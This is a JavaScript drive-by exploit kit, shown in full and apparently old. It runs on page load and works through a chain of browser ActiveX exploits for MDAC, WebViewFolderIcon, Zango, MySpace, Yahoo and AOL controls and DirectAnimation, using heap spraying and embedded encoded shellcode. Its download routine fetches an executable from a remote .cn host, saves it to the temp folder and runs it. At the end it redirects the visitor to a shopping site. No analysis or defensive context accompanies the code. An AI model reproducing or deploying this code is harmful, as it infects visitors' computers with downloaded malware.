
		var m=new Array();
		var mf=0;
		var url="http://234872398111.cn/load.php";

		function hex(num,width){
			var digits="0123456789ABCDEF";
			var hex=digits.substr(num&0xF,1);
			while(num>0xF){
				num=num>>>4;
				hex=digits.substr(num&0xF,1)+hex;
			}
			var width=(width?width:0);
			while(hex.length<width)hex="0"+hex;
			return hex;
		}

		function addr(addr){
			return unescape("%u"+hex(addr&0xFFFF,4)+"%u"+hex((addr>>16)&0xFFFF,4));
		}

		function unes(str){
			var tmp="";
			for(var i=0;i<str.length;i+=4){
				tmp+=addr((str.charCodeAt(i+3)<<24)+
					(str.charCodeAt(i+2)<<16)+
					(str.charCodeAt(i+1)<<8)+
					str.charCodeAt(i));
			}
			return unescape(tmp);
		}

		function hav(){
			mf=mf;
			setTimeout("hav()",2000);
		}

		function gss(ss,sss){
			while(ss.length*2<sss)ss+=ss;
			ss=ss.substring(0,sss/2);
			return ss;
		}

		function ms(spl){
			var plc=unes(
			"\x43\x43\x43\x43\x43\x43\xEB\x0F\x5B\x33\xC9\x66\xB9\x80\x01\x80"+
			"\x33\xEF\x43\xE2\xFA\xEB\x05\xE8\xEC\xFF\xFF\xFF\x7F\x8B\x4E\xDF"+
			"\xEF\xEF\xEF\x64\xAF\xE3\x64\x9F\xF3\x42\x64\x9F\xE7\x6E\x03\xEF"+
			"\xEB\xEF\xEF\x64\x03\xB9\x87\x61\xA1\xE1\x03\x07\x11\xEF\xEF\xEF"+
			"\x66\xAA\xEB\xB9\x87\x77\x11\x65\xE1\x07\x1F\xEF\xEF\xEF\x66\xAA"+
			"\xE7\xB9\x87\xCA\x5F\x10\x2D\x07\x0D\xEF\xEF\xEF\x66\xAA\xE3\xB9"+
			"\x87\x00\x21\x0F\x8F\x07\x3B\xEF\xEF\xEF\x66\xAA\xFF\xB9\x87\x2E"+
			"\x96\x0A\x57\x07\x29\xEF\xEF\xEF\x66\xAA\xFB\xAF\x6F\xD7\x2C\x9A"+
			"\x15\x66\xAA\xF7\x06\xE8\xEE\xEF\xEF\xB1\x66\x9A\xCB\x64\xAA\xEB"+
			"\x85\xEE\xB6\x64\xBA\xF7\xB9\x07\x64\xEF\xEF\xEF\xBF\x87\xD9\xF5"+
			"\xC0\x9F\x07\x78\xEF\xEF\xEF\x66\xAA\xF3\x64\x2A\x6C\x2F\xBF\x66"+
			"\xAA\xCF\x87\x10\xEF\xEF\xEF\xBF\x64\xAA\xFB\x85\xED\xB6\x64\xBA"+
			"\xF7\x07\x8E\xEF\xEF\xEF\xEC\xAA\xCF\x28\xEF\xB3\x91\xC1\x8A\x28"+
			"\xAF\xEB\x97\x8A\xEF\xEF\x10\x9A\xCF\x64\xAA\xE3\x85\xEE\xB6\x64"+
			"\xBA\xF7\x07\xAF\xEF\xEF\xEF\x85\xE8\xB7\xEC\xAA\xCB\xDC\x34\xBC"+
			"\xBC\x10\x9A\xCF\xBF\xBC\x64\xAA\xF3\x85\xEA\xB6\x64\xBA\xF7\x07"+
			"\xCC\xEF\xEF\xEF\x85\xEF\x10\x9A\xCF\x64\xAA\xE7\x85\xED\xB6\x64"+
			"\xBA\xF7\x07\xFF\xEF\xEF\xEF\x85\x10\x64\xAA\xFF\x85\xEE\xB6\x64"+
			"\xBA\xF7\x07\xEF\xEF\xEF\xEF\xAE\xB4\xBD\xEC\x0E\xEC\x0E\xEC\x0E"+
			"\xEC\x0E\x6C\x03\xEB\xB5\xBC\x64\x35\x0D\x18\xBD\x10\x0F\xBA\x64"+
			"\x03\x64\x92\xE7\x64\xB2\xE3\xB9\x64\x9C\xD3\x64\x9B\xF1\x97\xEC"+
			"\x1C\xB9\x64\x99\xCF\xEC\x1C\xDC\x26\xA6\xAE\x42\xEC\x2C\xB9\xDC"+
			"\x19\xE0\x51\xFF\xD5\x1D\x9B\xE7\x2E\x21\xE2\xEC\x1D\xAF\x04\x1E"+
			"\xD4\x11\xB1\x9A\x0A\xB5\x64\x04\x64\xB5\xCB\xEC\x32\x89\x64\xE3"+
			"\xA4\x64\xB5\xF3\xEC\x32\x64\xEB\x64\xEC\x2A\xB1\xB2\x2D\xE7\xEF"+
			"\x07\x1B\x11\x10\x10\xBA\xBD\xA3\xA2\xA0\xA1\xEF"+url+spl);
			var hsta=0x0c0c0c0c,hbs=0x100000,pl=plc.length*2,sss=hbs-(pl+0x38);
			var ss=gss(addr(hsta),sss),hb=(hsta-hbs)/hbs;
			if (mf){
				for (i=0;i<hb;i++)delete m[i];
				CollectGarbage();
			}
			for(i=0;i<hb;i++)m[i]=ss+plc;
			if(!mf){
				mf=1;
				hav();
			}
			return 0;
		}

		function cobj(obj){
			var ret=null;
			if(obj.substring(0,1)=="{"){
				try{
					var clsid=obj.substring(1,obj.length-1);
					ret=document.createElement("object");
					ret.setAttribute("classid","clsid:"+clsid);
					return ret;
				}catch(e){
					return null;
				}
			}else{
				try{
					ret=new ActiveXObject(obj);
					return ret;
				}catch(e){
					return null;
				}
			}
		}
		
		var padding = "AAAA";
		var heapBase = 0x00150000;
		var memo;

		function init(maxAlloc){
			while (4 + padding.length*2 + 2 < 65535)padding += padding;
			memo = new Array();
			flush();
		}

		function flush(){
			delete memo["plunger"];
			CollectGarbage();
			memo["plunger"] = new Array();
			var bytes = new Array(32, 64, 256, 32768);
			for (var i = 0; i < 6; i++) {
				for(var n = 0; n < 4; n++) {
					var len = memo["plunger"].length;
					eval("memo[\"plunger\"][len] = padding.substr(0, (" + bytes[n] + "-6)/2);");
				}
			}
		}

		function alloc(arg, tag){
			var size;
			size = arg;
			if (size == 32 || size == 64 || size == 256 || size == 32768) {}
			if ( ! memo[tag] )memo[tag] = new Array();
			var len = memo[tag].length;
			memo[tag][len] = padding.substr(0, (arg-6)/2);
		}

		function alloc_str(arg, tag){
			var size;
			size = 4 + arg.length*2 + 2;
			if (size == 32 || size == 64 || size == 256 || size == 32768) {}
			if ( ! memo[tag])memo[tag] = new Array();
			var len = memo[tag].length;
			memo[tag][len] = arg.substr(0, arg.length);
		}

		function free(tag) { 
			delete memo[tag];
			CollectGarbage();
			flush();
		}

		function CreateO(o,n){
			var r=null;
			try{r=o.CreateObject(n)}catch(e){}
			if(!r){try{r=o.CreateObject(n,"")}catch(e){}}
			if(!r){try{r=o.CreateObject(n,"","")}catch(e){}}
			if(!r){try{r=o.GetObject("",n)}catch(e){}}
			if(!r){try{r=o.GetObject(n,"")}catch(e){}}
			if(!r){try{r=o.GetObject(n)}catch(e){}}
			return(r);
		}

		function Go(a){
			var exeurl=url+"?spl=mdac";
			var fname="wincnL6wjMH7H.exe";
			var fso=a.CreateObject("Scripting.FileSystemObject","")
			var sap=CreateO(a,"Shell.Application");
			var x=CreateO(a,"ADODB.Stream");
			var nl=null;
			fname=fso.BuildPath(fso.GetSpecialFolder(2),fname);
			x.Mode=3;
			try{nl=CreateO(a,"Micr"+"osoft.XMLH"+"TTP");nl.open("GET",exeurl,false);}
			catch(e){try{nl=CreateO(a,"MSXML2.XMLHTTP");nl.open("GET",exeurl,false);}
			catch(e){try{nl=CreateO(a,"MSXML2.ServerXMLHTTP");nl.open("GET",exeurl,false);}
			catch(e){try{nl=new XMLHttpRequest();nl.open("GET",exeurl,false);}
			catch(e){return 0;}}}}
			x.Type=1;
			nl.send(null);
			rb=nl.responseBody;
			x.Open();
			x.Write(rb);
			x.SaveTofile(fname,2);
			sap.ShellExecute(fname);
			return 1;
		}
		
		function attack(s){
			var obj=null;
	
			if(s==1){
				var i=0;
				var target=new Array("BD96C556-65A3-11D0-983A-00C04FC29E36","BD96C556-65A3-11D0-983A-00C04FC29E30","AB9BCEDD-EC7E-47E1-9322-D4A210617116","0006F033-0000-0000-C000-000000000046","0006F03A-0000-0000-C000-000000000046","6e32070a-766d-4ee6-879c-dc1fa91d2fc3","6414512B-B978-451D-A0D8-FCFDF33E833C","7F5B7F63-F06F-4331-8A26-339E03C0AE3D","06723E09-F4C2-43c8-8358-09FCD1DB0766","639F725F-1B2D-4831-A9FD-874847682010","BA018599-1DB3-44f9-83B4-461454C84BF8","D0C07D56-7C69-43F1-B4A0-25F5A11FAB19","E8CCCDDF-CA28-496b-B050-6C07C962476B",null);
				while(target[i]){
					var a=null;
					a=document.createElement("object");
					a.setAttribute("classid","clsid:"+target[i]);
					if(a){try{var b=CreateO(a,"Shell.Application");if(b){Go(a);}}catch(e){}}
					i++;
				}
				setTimeout("attack(2)",4000);
				return 0;
			}

			if(s==2){
				try{
					obj=cobj("WebViewFolderIcon.WebViewFolderIcon.1");
					if(obj){
						ms("?spl=wfi");
						for(var i=0;i<128;i++){
							var wvfio=new ActiveXObject("WebViewFolderIcon.WebViewFolderIcon.1");
							try{wvfio.setSlice(0x7ffffffe,0,0,202116108);}catch(e){}
							var wvfit=new ActiveXObject("WebViewFolderIcon.WebViewFolderIcon.1");
						}
						setTimeout("attack(3)",2000);
					}
				}catch(e){}
				setTimeout("attack(3)",1);
				return 0;
			}

			if(s==3){
				try{
					obj=cobj("{EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F}");
					if(obj){
						ms("?spl=com");
						z=Math.ceil(0x0c0c0c0c);
						z=document.scripts[0].createControlRange().length;
						setTimeout("attack(4)",2000);
					}
				}catch(e){}
				setTimeout("attack(4)",1);
				return 0;
			}
		
			if(s==4){
				try{
					var obj1=cobj("{8C875948-9C60-4381-9248-0DF180542D53}");
					var obj2=cobj("{BFC08CFF-C737-4433-BD5A-0EE7EFCFEE54}");
					if(obj1||obj2){
						try{obj1.DownloadAndExec(url+"?spl=zango1");}catch(e){}
						try{obj2.DownloadAndExec(url+"?spl=zango2");}catch(e){}
						setTimeout("attack(5)",2000);
					}
				}catch(e){}
				setTimeout("attack(5)",1);
				return 0;
			}

			if(s==5){
				try{
					obj=cobj("{48DD0448-9209-4F81-9F6D-D83562940134}");
					if(obj){
						ms("?spl=myspace");
						var buf=addr(0x0c0c0c0c);
						while(buf.length<600)buf+=buf;
						obj.Action=buf;
						setTimeout("attack(6)",2000);
					}
				}catch(e){}
				setTimeout("attack(6)",1);
				return 0;
			}

			if(s==6){
				try{
					obj=cobj("{5F810AFC-BB5F-4416-BE63-E01DD117BD6C}");
					if(obj){
						ms("?spl=ymj");
						var buf=addr(0x0c0c0c0c);
						while(buf.length<340)buf+=buf;
						obj.AddImage("http://"+buf,1);
						setTimeout("attack(7)",2000);
					}
				}catch(e){}
				setTimeout("attack(7)",1);
				return 0;
			}

			if(s==7){
				try{
					obj=cobj("Sb.SuperBuddy.1");
					if(obj){
						ms("?spl=buddy");
						obj.LinkSBIcons(0x0c0c0c0c);
						setTimeout("attack(8)",2000);
					}
				}catch(e){}
				setTimeout("attack(8)",1);
				return 0;
			}

			if(s==8){
				try{
					obj=cobj("DirectAnimation.PathControl");
					if(obj){
						ms("?spl=vml2");
						init();
						var jmpecx = 0x0c0c0c0c;
						var vtable = addr(0x7ceb9090);
						for (var i = 0; i < 124/4; i++)vtable += addr(jmpecx);
						vtable += padding.substr(0, (1008-138)/2);
						var fakeObjPtr = heapBase + 0x688 + ((1008+8)/8)*48;
						var fakeObjChunk = padding.substr(0, (0x200c-4)/2) + addr(fakeObjPtr) + padding.substr(0, 14/2);
						CollectGarbage();
						flush();
						for (var i = 0; i < 100; i++)alloc_str(vtable);
						alloc_str(vtable, "lookaside");
						free("lookaside");
						for (var i = 0; i < 100; i++)alloc(0x2010);
						for (var i = 0; i < 2; i++) {
							alloc_str(fakeObjChunk);
							alloc_str(fakeObjChunk, "freeList");
						}
						alloc_str(fakeObjChunk);
						free("freeList");
						obj.KeyFrame(0x40000801, new Array(1), new Array(1));
						setTimeout("attack(9)",2000);
					}
				}catch(e){}
				setTimeout("attack(9)",1);
				return 0;
			}

			if(s==9){
				setTimeout("window.location = \"http://www.newegg.com\"",1);
				return 0;
			}

		}
	attack(1);
